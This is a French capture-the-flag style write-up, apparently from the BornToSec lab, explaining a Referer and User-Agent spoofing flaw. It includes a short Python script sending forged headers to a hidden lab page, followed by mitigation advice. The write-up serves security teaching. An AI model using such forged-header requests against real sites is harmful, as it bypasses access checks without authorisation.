# Vulnérabilité de Referer Spoofing (Falsification de Referer)

## Découverte
Sur la page d'accueil du site, tout en bas, j'ai trouvé un lien "BornToSec" qui mène vers l'URL http://10.13.248.97/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f. En explorant cette page et en inspectant son code source, on a trouvé des commentaires HTML cachés révélant que l'application vérifie des en-têtes HTTP spécifiques :
- `Referer: https://www.nsa.gov/`
- `User-Agent: ft_bornToSec`

## Vulnérabilité
Il s'agit d'une vulnérabilité de **falsification des en-têtes Referer et User-Agent**. L'application utilise des en-têtes HTTP contrôlés par le client pour les contrôles d'accès, qui peuvent être facilement manipulés.

## Exploitation
On a créé un script Python simple pour envoyer une requête avec les en-têtes modifiés :
```python
import requests

headers = {
    'Referer': 'https://www.nsa.gov/',
    'User-Agent': 'ft_bornToSec'
}

response = requests.get('http://10.13.248.97/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)
```

## Atténuation
- Ne pas se fier aux en-têtes contrôlés par le client pour les décisions de sécurité
- Mettre en place une authentification appropriée avec des jetons de session ou des clés API
- Utiliser une vérification côté serveur pour le contrôle d'accès
- Appliquer des contrôles d'autorisation appropriés basés sur les rôles des utilisateurs authentifiés